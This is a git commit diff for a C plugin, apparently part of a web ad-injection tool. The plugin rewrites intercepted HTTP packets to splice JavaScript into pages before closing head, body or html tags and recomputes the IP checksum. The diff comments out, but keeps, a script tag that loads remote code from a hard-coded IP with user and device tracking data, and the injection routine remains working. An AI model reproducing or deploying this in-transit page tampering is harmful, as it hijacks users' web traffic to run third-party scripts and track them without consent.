87b70fbb293f80e2fee6419b0acdc5f0546b2dba
root <root@localhost.localdomain>
2015-11-29 22:33:59 -0500

    insert js weizhi

--- webad/plug_insert_js.c
+++ webad/plug_insert_js.c
@@ -1,31 +1,33 @@
 #include "main.h"
 
-//#define JS "hello world"
-#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
+#define JS "hello world"
+//#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
 #define JS_LEN strlen(JS)
 
 PRIVATE int insert_js(void *data)
 {
 	struct _skb *skb=(struct _skb *)data;
     char* body;
-	int offset=0;
     char buffer[BUFSIZE];
 	int len=0;
-	
+	int i;
+	char res[][16]={"</head>","</body>" ,"</html>"};
     if(!skb->http_head)
 		return -1;
 
-    body=strstr(skb->http_head , "</head>");
-	offset=7;
+    for(i=0;i<3;i++)
+    {
+		body=strstr(skb->http_head , res[i]);
+		if(body)
+		{
+			break;
+		}
+		
+	}
 	if(!body)
 	{
-		body=strstr(skb->http_head , "<body>");
-		offset=6;
-		if(!body)
-			return -1;
+		return -1;
 	}
-    body=body+offset;
-	
 	len=strlen(body);
 	memcpy(buffer , skb->http_head , skb->http_len-len);
 	memcpy(buffer+(skb->http_len-len) , JS , JS_LEN);
@@ -36,7 +38,7 @@ PRIVATE int insert_js(void *data)
 	//if(!body)
 	//	return -1;
 	//memcpy(body , "2952" , 4);
-	//debug_log("````````````%s\n" , skb->http_head);
+	//debug_log("````````````%s\n````````````````````\n" , skb->http_head);
     skb->iph->tot_len=htons(skb->http_len+JS_LEN);
     skb->iph->check=ip_chsum(skb->iph);
 
